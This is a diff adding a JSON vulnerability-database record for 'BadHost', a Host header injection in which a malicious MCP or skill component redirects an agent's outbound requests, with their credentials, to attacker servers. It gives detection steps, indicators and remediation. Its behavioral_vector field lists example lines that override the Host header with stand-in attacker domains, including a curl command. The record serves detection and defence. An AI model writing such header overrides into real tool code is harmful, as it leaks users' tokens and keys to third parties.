@@ -1,0 +1,88 @@
+{
+  "ave_id": "AVE-2026-00049",
+  "schema_version": "1.0.0",
+  "status": "active",
+  "published": "2026-06-21T00:00:00Z",
+  "last_updated": "2026-06-21T00:00:00Z",
+  "component_type": "mcp_server",
+  "title": "HTTP Host Header Injection via Agent-Initiated Request (BadHost)",
+  "attack_class": "Supply Chain - HTTP Header Injection",
+  "severity": "HIGH",
+  "description": "A skill or MCP component injects a malicious Host header (or other HTTP request headers such as X-Forwarded-Host or X-Original-URL) into agent-initiated outbound HTTP requests. By overriding the Host header, the attacker redirects the request to an attacker-controlled server while the agent believes it is contacting the legitimate declared endpoint. The server at the injected host receives the full request including any authentication tokens, API keys, or session credentials the agent was sending to the legitimate target.",
+  "behavioral_fingerprint": "Component sets or overwrites the HTTP Host header on outbound requests to a value that does not match the declared target endpoint's natural host. The injected host points to attacker infrastructure. Pattern also manifests as X-Forwarded-Host, X-Original-URL, or Forwarded header manipulation that causes server-side request routing to an unintended destination.",
+  "behavioral_vector": [
+    "requests.get(url, headers={'Host': 'evil.com'})",
+    "headers['X-Forwarded-Host'] = 'attacker.com'",
+    "curl -H 'Host: attacker.io' https://api.legitimate.com/endpoint",
+    "httpx.get(target, headers={'Host': override_host})",
+    "fetch(url, { headers: { 'Host': exfil_host } })"
+  ],
+  "mutation_count": 12,
+  "detection_methodology": "1. Scan skill and MCP tool files for explicit Host header assignment in HTTP request code. 2. Flag X-Forwarded-Host or X-Original-URL header injection patterns. 3. Check for header construction where host value is sourced from a variable that differs from the URL's authority component. 4. Flag curl or fetch patterns with -H 'Host:' overrides pointing to domains other than the URL domain.",
+  "indicators_of_compromise": [
+    "Explicit Host header set in outbound HTTP request to a value differing from the request URL's host",
+    "X-Forwarded-Host or X-Original-URL header injected with external domain value",
+    "HTTP client constructed with headers dict containing 'Host' key",
+    "Forwarded header containing host= with attacker-controlled domain",
+    "curl invocation with -H 'Host: <external-domain>' flag alongside a different target URL"
+  ],
+  "remediation": "1. Never allow skill or tool code to override the Host header on outbound requests unless the target host is explicitly declared in the skill manifest. 2. Validate that the Host header in any HTTP client configuration matches the authority component of the declared endpoint URL. 3. Pin the Host header to the URL's own authority in any HTTP client wrapper. 4. Block outbound requests where Host header does not match the request URL host at the agent's HTTP transport layer.",
+  "researcher": "Bawbel Security Research Team",
+  "researcher_url": "https://bawbel.io",
+  "owasp_mcp": ["MCP04", "MCP05"],
+  "owasp_mapping": ["ASI03", "ASI06"],
+  "mitre_atlas_mapping": ["AML.T0011"],
+  "nist_ai_rmf_mapping": ["MAP-1.5", "MEASURE-2.6"],
+  "aivss_score": 7.5,
+  "aivss": {
+    "cvss_base": 7.5,
+    "aarf": {
+      "autonomy": 1,
+      "tool_use": 1,
+      "multi_agent": 0.5,
+      "non_determinism": 0.5,
+      "self_modification": 0,
+      "dynamic_identity": 0.5,
+      "persistent_memory": 0,
+      "natural_language_input": 1,
+      "data_access": 1,
+      "external_dependencies": 1
+    },
+    "aars": 6.5,
+    "thm": 0.85,
+    "mitigation_factor": 1,
+    "aivss_score": 7.5,
+    "aivss_severity": "HIGH",
+    "spec_version": "0.8",
+    "owasp_mcp_mapping": ["MCP04", "MCP05"],
+    "notes": "AARF elevated by autonomy and external dependency factors. Agent-initiated requests carrying credentials to attacker host amplifies impact."
+  },
+  "references": [
+    {
+      "tag": "BadHost Research",
+      "text": "BadHost: HTTP Host Header Injection in Agent-Initiated Requests",
+      "url": "https://spec.modelcontextprotocol.io/specification/security_best_practices/"
+    },
+    {
+      "tag": "OWASP",
+      "text": "OWASP Host Header Injection",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection"
+    },
+    {
+      "tag": "CWE",
+      "text": "CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax",
+      "url": "https://cwe.mitre.org/data/definitions/644.html"
+    },
+    {
+      "tag": "Reference",
+      "text": "https://api.piranha.bawbel.io/records/AVE-2026-00049",
+      "url": "https://api.piranha.bawbel.io/records/AVE-2026-00049"
+    }
+  ],
+  "evidence_kind_default": "tool_description_pattern",
+  "detection_stage": "static_detection",
+  "detection_layer": "content",
+  "confidence_baseline": 0.82,
+  "evidence_basis_engines": ["pattern", "semgrep"],
+  "derivable_into": []
+}
